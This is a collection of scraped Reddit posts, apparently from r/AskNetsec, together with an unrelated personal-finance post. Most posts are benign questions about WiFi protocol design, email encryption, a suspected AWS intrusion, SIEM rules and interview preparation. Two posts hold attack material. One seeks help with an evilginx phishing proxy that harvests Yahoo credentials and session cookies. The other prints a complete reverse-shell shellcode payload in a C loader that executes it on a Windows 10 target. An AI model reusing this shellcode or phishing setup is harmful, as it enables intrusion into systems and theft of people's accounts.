We don't own a home. We have about 20K in debt, and I have about 3K due in back child support but over pay every month so it's dropping. \n\nI've been fired from one job for lying to my boss about why I was late. I've had a TON of side jobs through my career, bartending, server, bar manager etc. \n\nNo felonies, no DUI's, no arrests or detainments. I have some speeding tickets when I was 16 and stupid. No bankruptcies, no late bills other than the back due child support. My credit score is 695 right now, and my wife is 780. \n\n\nIs there anything I should be worried about?

        "title": "Would this idea feasibly work for a more secure WiFi protocol/environment?",
        "author": "Zagaroth",
        "url": "https://www.reddit.com/r/AskNetsec/comments/78c0fk/would_this_idea_feasibly_work_for_a_more_secure/",
        "text": "This idea is born of the issues with metadata and when/how WiFi connections are compromised, and is in part an attempt to help anonymize connecting clients against third parties. Also, I am not a crypto expert by a long shot, so I'm sure that even if my basic idea is close to working, there would need to be some tweaking and modification even before details like crypto suites and such are decided.\n\nThe first thing my protocol idea would probably require is that every device (client and access point) using this new protocol be able to support 2 separate networks (1 for this protocol, 1 for older protocols), possible even separate antennas, as it is not very backwards compatible. Also, this would be used even on 'open' access points, which does have a cost in bandwidth availability and processing power/time. \n\nThat's a kind of large hurdle for mobile devices, but maybe someone else can see a better solution. But an upside would be the ability to disable previous WiFi protocol to force a device to use only the new one.\n\nSecond, every device has to have a device-unique public/private key, probably standardized to be elliptic curve crypto. \n\nClients do not broadcast/ping when they are not connected to a network, nor do they respond to any attempted communication that is not from a network they know, they only listen. \n\nAccess points broadcast both their SSID and their public key. Clients remember public keys in conjunction with SSID, and identify networks with the same SSID and different public keys as being different networks. \n\nCommunication is initiated by the client, which uses the SSID to announce the attempt to communicated, then immediately switches to using the Access Point's public key to encrypt the rest of the handshake. \n\nThe first part of the first Client-to-Access Point hand shake is a random-bit-length nonsense nonce (with a fixed-length sequence for the termination signal?). This is to 'churn' the crypto so that there is no way to ever send the same encrypted text twice. \n\nThe second part of the C-to-AP hand shake is the client's ID, which for this purpose should probably also be a Nonce, but kept for the length of this connection/session with the AP. A new nonce would be generated if connection was lost and a new handshake had to be done.\n\nThe third part of the C-to-AP hand shake is the client's Public Key, which the AP will use during the hand shake until the encryption key is negotiated. If white/blacklisting clients, you'd probably use this.\n\nAnd the final part would be initiating key negotiation.\n\nThe access point's reply would look similar, using the client's nonce-ID for addressing in the clear but also including its own SSID, then using the client's public key for encryption, using a Nonce to start churning, a private-key encryption of the client's ID nonce (i.e. signing it to verify its own identity, though limited to verification that it is the SSID who broadcast the matching public key), then key negotiation. \n\nContinue in this vein as needed to complete key negotiation for long term communications.\n\nOnce key negotiation is completed, the communication protocol would be mostly similar to current communication protocols, except that the only text in the clear are the SSID of the access point and the temp-ID of the clients.\n\nThe AP has to maintain track of the separate negotiated keys, much like an HTTPS server, then delete them when the connection is terminated or dropped.\n\n*After* encryption has been established, a non-public Access Point would ask for authorization (password), which for high security connections would be required *in addition to* preemptively whitelisting the public key.\n\nA high security connection might also require that the client device be using a public/private key pair that is only used for that Access Point's SSID/public key, so that no other network ever acquires that client's public ID used to whitelist it. There should be control panel settings in the client to set this up, IoT devices never go onto high security networks obviously.\n\nFor multi-access-point networks (such for broadcasting throughout a larger company's building), the IT department would ensure each WiFi router has the same public/private key pair loaded. Compromise of any AP on this network would of course necessitate the changing of this pair on all devices, and editing settings on all client devices.\n\nLike I said at the time, I'm sure there are refinements that this needs, but I've been running over the idea for a while and I'm pretty certain its close. \n\nIf it's a great idea, maybe I can find a way to offer it up as the start of an official protocol, if it's slightly flawed then maybe it can be fixed then offered. \n\nif it's seriously flawed, then... well, maybe it has a seed of an idea that some one else can work with. :)",

Why is email so blatantly open?\n\nAlot of personal information, name, address, online account information, etc, is regularly sent through email. You could learn alot about someone. On top of that, email providers, such as google, openly acknowledge that they scan your emails for \"advertising purposes\".\n\nUsing PGP as an example, and based on my understanding of it, encrypted communication is not hard, or time consuming. In my opinion, the service provider should never see unencrypted data, unless of course the user sent it that way. Public key could simply be a user account requirement for email communication when registering for whatever web accounts take your fancy. \n\nThe problem of course lies in the fact that both parties have be involved in the encryption process. Even if I wanted to secure my email communication, I can't, because businesses, and other users such as friends or family, don't secure their communication. So what gives. Why has email communication, aside from perhaps inter-business, not adopted secure communication practices?",

Hoping you guys might be able to clue me in on if this is something I should be worried about or not. \n\n1) Somebody was mass-scanning a web server (we will call it instance1) with every known php vuln known to man.  We don't run php so I figured it was some skiddie with his new Nexpose trial having fun.  We host in AWS and I noticed the offender hosted in AWS as well so I reported abuse.  A couple days later I got an abuse report form AWS saying that my instance2 was involved in \"abusive\" traffic towards my instance1.  So, yes, somehow I reported myself to AWS.  Go figure.  In that abuse report it lists my instance ID which, I've identified as instance2, and it lists a source IP that is not associate with my instance.  Haven't figured that one out yet... but figured that the src was instance2 attacking my instance1.\n\n2) Our VPN server keeps crashing today.  This is also hosted in AWS and has been running steady for a couple years.  It's bullet proof and yet it's stopped twice in the past 24 hours.  Unusual.\n\n3) Along the lines of VPN -- I wish I could confirm this 100% but it seems that my VPN password has changed.  There are only two passwords that it could be and neither worked.  SSH'ing back into the server and resetting my password again fixed the problem.  Suspicious that someone changed my password.\n\n4) Also on that VPN server the /var/log/wtmp is off.  Not sure when that would have happened.  Trying to decide if this is malicious or if at some point it was just turned off for some reason.\n\nI'm hoping there is nothing behind this but need your opinions.  It seems that scanning with all the php vulns/flooding our logs and shutting off the VPN server are very attention-drawing... if this is malicious.\n\nA couple things to add... all of our AWS instances uses pubkeys for auth and not passwords.  Also, we use the /etc/ssh/sshd_config AllowedUsers to specify the only users allowed to connect.  Lastly, firewall rules are used as efficiently as possible to allow SSH only from trusted sources... sure the list might be a little outdated and some cleanup needed as certain ISPs change... but regardless would require someone to try to connect from 1 of 20 or so \"trusted\" IPs.\n\nIf you were me what would your next steps be?\n\nedit1: clarifying point #1 \nedit2: added piece about SSH security (pubkeys, allowedusers, firewall)",

Only one small problem i would like to resolv and in which i hope someone will be able to help me here!\n\nWhen the user browse =&gt; https://login.not-really-yahoo.com The proxy works correctly and the user need to enter a valid yahoo email &amp; password otherwise login is not allowed !\n\nWhen he does enter a valid credentials (i've been using a fresh yahoo acount to test on myself) the user and password are sniffed by evilginx and saved into the logs (so at least i got that part right) and the user is redirected to the main page of yahoo alias : .yahoo.com (=the two letters for the language version us,de,fr...)\n\nbut first thing to solve is : the user isn't logged in so my guess is i've done something wrong somewhere with the cookies since they're set to secure and httpOnly.\n\nand second issue is pretty much the same : i got username and password in log but no cookies .. !\n\nSo i'm wondering what did i do wrong in my config ?\n\nhttps://github.com/leperjulien/script\n\nIf anyone is willing to help me or take a quick look to maybe spot the problem and explain to me what i did wrong, that would be awesome!\n",

I will take rule 3 as an example. It says a good security practice is to make your classes/methods final. \n&gt; If a class or method isn't final, an attacker could try to extend it in a dangerous and unforeseen way. \n\nMy question is how will an external attacker who can only interface with the web application through the public website extend a class or method of the web application? Many of the rules mentioned in the article somehow assume the attacker has access to the code base of the application. Aren't you already screwed if the attacker has that kind of access.",

As a result, I've created a cursory ruleset, but I'd like to hear what else you guys are doing.\n\nHere is the situation: We have a basic bullshit CISCO firewall (no IPS, Snort, nothing) spitting out syslog information. The fields are pretty much limited to source ip, destination ip, source port and destination port. Some other goodies in there are packet size, packet header length, etc.\n\nFor my basic rules, I've pretty much turned to this:\n\n1. Data Enrichment - utilize public threat intel sources to enrich data and alert if an IP address is communicating with a known C2 or malware server.\n\n2. Suspicious activity - notify when commonly abused services (SSH and RDP) are being accessed by a public IP.\n\n3. Rare port usage - monitor for rare port usage and determine what the cause could be.\n\n4. DNS Requests - monitor for many DNS requests in a short period of time as a form of data exfiltration (single host -&gt; many DNS requests).\n\n5. Inherent Firewall Rules - review alerts created by the firewall for cursory awareness.\n\nAre there any other easy wins that I'm not thinking of? With the basic fields and no SSL inspection it can be pretty tough to get some good results.\n\nThanks",

My target is Windows 10.\n\nHere's what my C file looks like right now:\n    \n    #include &lt;stdio.h&gt;    \n    \n    unsigned char payload[] =\n            \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n            \"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n            \"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\"\n            \"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\"\n            \"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\"\n            \"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\"\n            \"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\"\n            \"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\"\n            \"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\"\n            \"\\x8d\\x5d\\x68\\x6e\\x65\\x74\\x00\\x68\\x77\\x69\\x6e\\x69\\x54\\x68\\x4c\"\n            \"\\x77\\x26\\x07\\xff\\xd5\\x31\\xdb\\x53\\x53\\x53\\x53\\x53\\x68\\x3a\\x56\"\n            \"\\x79\\xa7\\xff\\xd5\\x53\\x53\\x6a\\x03\\x53\\x53\\x68\\xbb\\x01\\x00\\x00\"\n            \"\\xe8\\x50\\x01\\x00\\x00\\x2f\\x76\\x6c\\x33\\x56\\x6a\\x65\\x6d\\x6b\\x35\"\n            \"\\x4a\\x76\\x4e\\x59\\x38\\x78\\x69\\x6c\\x49\\x58\\x68\\x53\\x51\\x6d\\x5f\"\n            \"\\x4a\\x41\\x61\\x67\\x33\\x56\\x56\\x4d\\x68\\x64\\x4b\\x72\\x32\\x53\\x78\"\n            \"\\x51\\x31\\x55\\x5f\\x76\\x42\\x67\\x31\\x41\\x37\\x65\\x58\\x58\\x41\\x33\"\n            \"\\x36\\x46\\x70\\x50\\x74\\x4b\\x6f\\x58\\x43\\x75\\x77\\x38\\x67\\x68\\x66\"\n            \"\\x47\\x6e\\x50\\x4c\\x6a\\x4f\\x5a\\x70\\x38\\x68\\x43\\x4e\\x56\\x7a\\x44\"\n            \"\\x31\\x39\\x64\\x52\\x53\\x4e\\x39\\x75\\x5a\\x68\\x37\\x66\\x62\\x63\\x54\"\n            \"\\x45\\x6c\\x37\\x66\\x5f\\x74\\x48\\x4b\\x6d\\x37\\x34\\x4f\\x66\\x78\\x6c\"\n            \"\\x68\\x59\\x6f\\x4e\\x76\\x4f\\x78\\x65\\x65\\x6d\\x71\\x77\\x41\\x68\\x34\"\n            \"\\x43\\x72\\x79\\x39\\x4c\\x70\\x37\\x61\\x33\\x58\\x50\\x48\\x6f\\x46\\x74\"\n            \"\\x5a\\x77\\x2d\\x5f\\x37\\x31\\x7a\\x66\\x73\\x49\\x59\\x54\\x58\\x4e\\x61\"\n            \"\\x30\\x72\\x48\\x58\\x61\\x70\\x49\\x76\\x34\\x49\\x70\\x56\\x42\\x6e\\x6e\"\n            \"\\x56\\x75\\x70\\x38\\x78\\x69\\x50\\x45\\x44\\x30\\x62\\x38\\x71\\x50\\x34\"\n            \"\\x6d\\x42\\x00\\x50\\x68\\x57\\x89\\x9f\\xc6\\xff\\xd5\\x89\\xc6\\x53\\x68\"\n            \"\\x00\\x32\\xe0\\x84\\x53\\x53\\x53\\x57\\x53\\x56\\x68\\xeb\\x55\\x2e\\x3b\"\n            \"\\xff\\xd5\\x96\\x6a\\x0a\\x5f\\x68\\x80\\x33\\x00\\x00\\x89\\xe0\\x6a\\x04\"\n            \"\\x50\\x6a\\x1f\\x56\\x68\\x75\\x46\\x9e\\x86\\xff\\xd5\\x53\\x53\\x53\\x53\"\n            \"\\x56\\x68\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x75\\x14\\x68\\x88\\x13\"\n            \"\\x00\\x00\\x68\\x44\\xf0\\x35\\xe0\\xff\\xd5\\x4f\\x75\\xcd\\xe8\\x4b\\x00\"\n            \"\\x00\\x00\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x68\\x00\\x00\\x40\\x00\\x53\"\n            \"\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x53\\x89\\xe7\\x57\\x68\\x00\"\n            \"\\x20\\x00\\x00\\x53\\x56\\x68\\x12\\x96\\x89\\xe2\\xff\\xd5\\x85\\xc0\\x74\"\n            \"\\xcf\\x8b\\x07\\x01\\xc3\\x85\\xc0\\x75\\xe5\\x58\\xc3\\x5f\\xe8\\x6b\\xff\"\n            \"\\xff\\xff\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x35\\x30\\x2e\\x31\\x34\"\n            \"\\x30\\x00\\xbb\\xf0\\xb5\\xa2\\x56\\x6a\\x00\\x53\\xff\\xd5\";\n    \n    int main()\n    {\n        int (*ret)();\n        ret = (int (*)())payload;\n        (int)(*ret)();\n    }\n    \n\nThis is compiled into an EXE using mingw and then loaded onto the Windows 10 target. The 3 lines in the main function is me trying to call my shellcode and execute it in memory. The only thing that happens is the application crashes on the Windows 10 target and I don't get a shell spawned.\n\nMy first thought is that I'm running into an issue of a non-executable stack/memory region. This is more than likely the case considering it's Windows 10, but I'm not entirely sure.\n\nIf this is the case:\n\n1. Why does a normally generated meterpreter payload (in the format of an EXE) execute just fine? What are they doing differently under the hood? When I run the EXE generated by metasploit, I get a shell spawned no problem.\n\n2.   How do I fix this and get my shellcode to execute in memory?\n\nThanks",

I was told that searching certain terms on a search engine would provide a link that showed our URL address with some added characters added on (Ex. - www.sustainability.colostate.edu/events/cDY1NDIy), but when you click on the link in the search engine results, it takes you to an adult website.  \n\nYou currently can not find any of these pages via Google search. They appear to have been removed from their search results and caches. However, if you search on Bing or DuckDuckGo, these pages still appear to be cached there. The most recent notification of this issue was found on Bing when the user searched for 'national sexual health conference 2018' and one of these pages shows up as the first result on Bing. If you view the cached version of the page, you see one of our page templates with a whole bunch of text that I'm sure is some how crafted to rank high in search results. And if you actually click the link, it will take you to a pornographic website.  \n\nWhat I did at the time this was originally brought to my attention was go through a normal process of checking our CMS software for updates, updating where needed. I then spent time searching our website database for any content that shouldn't be there and found nothing. No extra pages, no extra database entries, nothing. It appears to me that whatever these pages are, they are not physically located in our server space.  \n\nI am not sure how to even identify what is going on with these extra pages. Any assistance in where I can even start searching for answers would be helpful. I am normally pretty resourceful and can find answers to a lot of things, but I can't concisely word this problem to do a simple Google search for answers. Please let me know if I can provide any specific details about our website setup to help with the process. Thanks again.",

And vice versa?\n\nWould a successful attacker be able to packet sniff my entire network?\n\nHas Linux source been patched?\n\nIf an attacker was successful, would they still be able to get into my network after I get patched?\n\nAnybody have any more questions you would like the pile on here?\n(edit: grammar)",

        "text": "I've scouted the net searching for infos, but the only things I found where books based on Python 2.\nI know that Python 2 isn't dead or anything, but there is Python 3 and I would like to start with the newer language, which if I recall correctly is \"cleaner\" and easier to understand. I have basic/moderate experience in c# and Java (4th year of Highschool, been programming since the third and we're now approaching OOP, classes and such, but I know how they work in the borader sense of things) and python is my first non-oop (I guess it's not? Correct me if I'm wrong) language.\n\nSo yeah I'm searching for resources specifically designed with Python 3 in mind (So far I've got Violent Python, Black hat Python and Gray Hat Python, all of which are based on Python 2) to start learning NetSec and stuff like that.\nThat's why I chose IT as my High School carreer anyway! Games and NetSec, those things are what really interest me. And Games can be learn with tutorials and stuff, netsec not so much I guess.\n\nOr at least, I didn't found any!",

        "text": "Hey AskNetsec,\n\nTomorrow I have an interview with a company as an Information Security Officer.\nThe job is described as entry level, and I have worked as a jr sysadmin for the past year, and level 1/2 helpdesk for 2 years prior to that. For reference:\n\nThis position is responsible for the review, analysis and reporting of Security Events.\n- Implementation of software, hardware and appropriate policies\n\nRequirements:\n\nKnowledge of ISO 27001, 27002 and PCI SSC Data security standards\nProblem solving/ analyst skills.\n\nFrom what I have heard about the security team/s (I was referred for an interview), I would be working on a 3 man team, and there is some sort of SOC around it that deals with incident response. Other than that, I don't really know too much about what the role would actually entail.\n\nI am wondering what kind of questions I would expect from this kind of role - probably more on the behavioral and some process orientated ones I can only assume as it's so entry level into InfoSec.\n\nI've looked at some other posts and got an idea for what could come up, such as:\n\n1. How do you keep up to date with the latest security trends or intelligence?\n2. How would you triage a security event? (Not sure if this is relevant since there's a SOC, but could be useful for escalated incidents or reporting the event to the public or executives.\n3. Knowledge around XSS, SQL injection etc... (again, possibly not relevant.)\n4. How have you applied information security practices in the past\n5. Have you any experience with maintenance or implementation of security technologies (SIEM, IDS/IPS, etc)\n\n\nThanks guys.",
